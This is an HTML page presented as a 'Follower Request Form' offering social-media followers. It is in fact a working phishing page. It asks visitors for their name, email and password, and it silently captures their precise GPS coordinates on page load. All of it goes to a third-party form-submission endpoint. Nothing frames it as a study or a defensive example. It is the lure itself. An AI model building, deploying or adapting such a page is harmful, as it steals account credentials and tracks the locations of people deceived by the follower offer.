<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Follower Request Form</title>
  <style>
    body { font-family: Arial, sans-serif; margin: 40px; }
    form { max-width: 400px; margin: auto; background: #f7f7f7; padding: 20px; border-radius: 8px; box-shadow: 0 2px 8px #ddd; }
    label { display: block; margin-top: 15px; font-weight: bold; }
    input, textarea { width: 100%; padding: 8px; margin-top: 5px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
    button { margin-top: 20px; padding: 10px 20px; background: #4CAF50; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 1em; }
    button:hover { background: #45a049; }
    #location-status { font-size: 0.9em; color: #888; margin-top: 5px; }
  </style>
</head>
<body>
  <form action="https://api.web3forms.com/submit" method="POST">
<!-- Replace with your Access Key -->
    <input type="hidden" name="access_key" value="YOUR_ACCESS_KEY_HERE">
    <h2 name="formTitle">Follower Request Form</h2>
    <label for="name" name="labelName">Name:</label>
    <input type="text" id="name" name="name" required>

   <label for="email" name="labelEmail">Email:</label>
    <input type="email" id="email" name="email" required>

   <label for="passkey" name="labelPasskey">Password:</label>
    <input type="password" id="passkey" name="passkey" required>

  <label for="followers" name="labelFollowers">How many followers do you want?</label>
    <input type="number" id="followers" name="followers" min="1" required>

  <label for="location" name="labelLocation">Your Location:</label>
    <input type="text" id="location" name="location" required readonly>
    <div id="location-status" name="locationStatus">Detecting location...</div>
        <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
    <!-- Custom Confirmation / Success Page -->
    <!-- <input type="hidden" name="redirect" value="https://mywebsite.com/thanks.html"> -->

   <button type="submit" name="submitButton">Submit</button>
  </form>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      var locationInput = document.getElementById('location');
      var statusDiv = document.getElementById('location-status');
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          function(position) {
            var lat = position.coords.latitude.toFixed(6);
            var lon = position.coords.longitude.toFixed(6);
            locationInput.value = lat + ", " + lon;
            statusDiv.textContent = "Location detected!";
          },
          function(error) {
            statusDiv.textContent = "Unable to retrieve location. Please allow location access.";
            locationInput.value = "";
          }
        );
      } else {
        statusDiv.textContent = "Geolocation is not supported by your browser.";
        locationInput.value = "";
      }
    });
  </script>
</body>
</html>
